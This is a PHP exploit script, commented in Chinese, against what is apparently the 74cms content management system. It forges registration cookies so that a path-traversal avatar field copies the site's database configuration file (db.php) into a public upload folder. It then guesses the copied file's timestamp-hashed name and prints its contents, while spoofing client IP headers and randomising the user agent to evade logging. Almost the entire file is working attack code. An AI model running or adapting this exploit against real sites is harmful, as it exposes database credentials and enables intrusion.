<?php
date_default_timezone_set('PRC');
class CmsFileRead
{
    /**
     * @return string  $domain 域名
     * @return string  $file   要读取的文件
     */
    public function __construct($domain = '', $file = '')
    {
        $this->domain = $domain;
        $this->file   = $file;
    }

    public function run()
    {
        if (!$this->domain) {
            exit('域名不能为空');
        }
        
        if (!$this->file) {
            exit('要读取的文件不能为空');
        }

        $url = $this->domain.'/index.php?m=Home&c=Members&a=register';

        $post_data = [
            'reg_type' => 2,
            'utype' => 2,
            'org' => 'bind',
            'ucenter' => 'bind',
        ];

        $uid = 1;
        $cookie = 'members_bind_info[temp_avatar]='.$this->file.';';
        $cookie .= 'members_uc_info[uid]='.$uid.';';
        $cookie .= 'members_bind_info[type]=qq;';
        $cookie .= 'members_uc_info[username]=test;';
        $cookie .= 'members_uc_info[password]=123456;';

        $this->curlRequest($url, $post_data, $cookie);

        $url_file = $this->domain.'/data/upload/avatar/'.date('ym/d/');

        $state_time = time()-15;

        for ($i=0; $i <= 100; $i++) { 
            $file_name = $url_file.md5($uid.($state_time+=1)).'.jpg';
            $res = @fopen($file_name, 'r');
            if ($res) {
                echo '----------- url ------------ <br/>'. $file_name.'<br/>';
                echo '<br/><br/><br/>';
                echo '----------- data ------------ <br/>'. htmlspecialchars(file_get_contents($file_name)).'<br/>';
                exit;
            } else {
                if ($i === 100) {
                    echo '此站点可能并无此漏洞 : )';
                    exit;
                }
            }
        }
    }

    private function curlRequest($url, $post = [], $cookie = '', $referurl = '')
    {
        if (!$referurl) {
            $referurl = 'https://www.baidu.com';
        }
    
        $header = array(
            'CLIENT-IP:' . $this->getIp(),
            'X-FORWARDED-FOR:' . $this->getIp(),
            'HTTP_CLIENT_IP:' .$this->getIp(),
            'HTTP_X_FORWARDED_FOR' . $this->getIp(),
            'REMOTE_ADDR:' . $this->getIp(),
            'Content-Type:application/x-www-form-urlencoded',
            'X-Requested-With:XMLHttpRequest',
        );
    
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        //随机浏览器useragent
        curl_setopt($curl, CURLOPT_USERAGENT, $this->agentArry());
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
        curl_setopt($curl, CURLOPT_REFERER, $referurl);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
    
        if ($post) {
            curl_setopt($curl, CURLOPT_POST, 1);
            curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
        }
    
        if ($cookie) {
            curl_setopt($curl, CURLOPT_COOKIE, $cookie);
        }
    
        curl_setopt($curl, CURLOPT_TIMEOUT, 10);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        $data = curl_exec($curl);
    
        if (curl_errno($curl)) {
            return curl_error($curl);
        }
    
        curl_close($curl);
        return $data;
    }
    
    private function getIp()
    {
        return mt_rand(11, 191) . "." . mt_rand(0, 240) . "." . mt_rand(1, 240) . "." . mt_rand(1, 240);
    }

    private function agentArry()
    {
        $agentarry = [
            //PC端的UserAgent
            "safari 5.1 – MAC" => "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
            "safari 5.1 – Windows" => "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Firefox 38esr" => "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
            "IE 11" => "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; InfoPath.3; rv:11.0) like Gecko",
            "IE 9.0" => "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0",
            "IE 8.0" => "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
            "IE 7.0" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
            "IE 6.0" => "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
            "Firefox 4.0.1 – MAC" => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
            "Firefox 4.0.1 – Windows" => "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
            "Opera 11.11 – MAC" => "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11",
            "Opera 11.11 – Windows" => "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
            "Chrome 17.0 – MAC" => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
            "傲游（Maxthon）" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0)",
            "腾讯TT" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; TencentTraveler 4.0)",
            "世界之窗（The World） 2.x" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
            "世界之窗（The World） 3.x" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)",
            "360浏览器" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
            "搜狗浏览器 1.x" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SE 2.X MetaSr 1.0; SE 2.X MetaSr 1.0; .NET CLR 2.0.50727; SE 2.X MetaSr 1.0)",
            "Avant" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser)",
            "Green Browser" => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
            //移动端口
            "safari iOS 4.33 – iPhone" => "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
            "safari iOS 4.33 – iPod Touch" => "Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
            "safari iOS 4.33 – iPad" => "Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
            "Android N1" => "Mozilla/5.0 (Linux; U; Android 2.3.7; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
            "Android QQ浏览器 For android" => "MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
            "Android Opera Mobile" => "Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10",
            "Android Pad Moto Xoom" => "Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
            "BlackBerry" => "Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+",
            "WebOS HP Touchpad" => "Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.0; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/233.70 Safari/534.6 TouchPad/1.0",
            "UC标准" => "NOKIA5700/ UCWEB7.0.2.37/28/999",
            "UCOpenwave" => "Openwave/ UCWEB7.0.2.37/28/999",
            "UC Opera" => "Mozilla/4.0 (compatible; MSIE 6.0; ) Opera/UCWEB7.0.2.37/28/999",
            "微信内置浏览器" => "Mozilla/5.0 (Linux; Android 6.0; 1503-M02 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile MQQBrowser/6.2 TBS/036558 Safari/537.36 MicroMessenger/6.3.25.861 NetType/WIFI Language/zh_CN",
        ];
        return $agentarry[array_rand($agentarry, 1)];
    }
}

// 要利用漏洞的域名
$domain = 'http://74cms.test'; 

// 要读取的文件
$file = '../../../../Application/Common/Conf/db.php;';

$cms_file_read = new CmsFileRead($domain, $file);
$cms_file_read->run();